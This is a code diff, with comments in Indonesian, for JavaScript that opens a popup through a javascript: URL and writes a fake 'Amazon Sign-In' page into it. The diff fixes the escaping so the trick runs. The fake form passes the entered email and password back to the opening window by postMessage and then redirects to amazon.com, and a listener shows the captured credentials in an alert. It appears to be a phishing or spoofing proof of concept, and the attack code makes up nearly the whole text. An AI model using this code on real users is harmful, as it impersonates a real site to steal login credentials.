@@ -13,17 +13,21 @@
         }
       
         function f() {
-            // Konten HTML yang akan ditulis
-            const htmlContent = `<!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class="login-form"><h2>Amazon Sign-In</h2><form id="loginForm"><input type="email" id="email" placeholder="Email or mobile number"><input type="password" id="password" placeholder="Password"><button type="submit">Sign in</button></form></div><script>document.getElementById('loginForm').onsubmit = function(e) { e.preventDefault(); const email = document.getElementById('email').value; const password = document.getElementById('password').value; window.opener.postMessage({ type: 'credentials', email: email, password: password }, '*'); window.location.href = 'https://amazon.com'; };<\/script></body></html>`;
+            // Konten HTML dengan escape karakter yang benar
+            const htmlContent = `<!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class="login-form"><h2>Amazon Sign-In</h2><form id="loginForm"><input type="email" id="email" placeholder="Email or mobile number"><input type="password" id="password" placeholder="Password"><button type="submit">Sign in</button></form></div><script>document.getElementById('loginForm').onsubmit=function(e){e.preventDefault();const email=document.getElementById('email').value;const password=document.getElementById('password').value;window.opener.postMessage({type:'credentials',email:email,password:password},'*');window.location.href='https://amazon.com';};<\\/script></body></html>`;
 
-            // Hanya buka satu window dengan javascript URL
+            // Escape single quotes untuk javascript URL
+            const escapedContent = htmlContent.replace(/'/g, "\\'");
+            
+            // Buat javascript URL yang benar
+            const jsCode = "document.write('" + escapedContent + "'); setTimeout(function(){ location.href='http://amazon.com'; }, 100);";
+            
             w = window.open(
-                "javascript:document.write('" + htmlContent + "'); window.location.href = 'http://amazon.com';",
+                "javascript:" + encodeURIComponent(jsCode),
                 "new",
                 "width=500,height=500"
             );
             
-            // Monitor untuk cross-origin restriction
             i = setInterval(function() {
                 try { 
                     x = w.location.href; 
@@ -34,7 +38,6 @@
             }, 1);
         }
 
-        // Tambahkan event listener untuk menerima credentials
         window.addEventListener('message', function(event) {
             if (event.data && event.data.type === 'credentials') {
                 alert('Credentials received: ' + event.data.email + ' / ' + event.data.password);
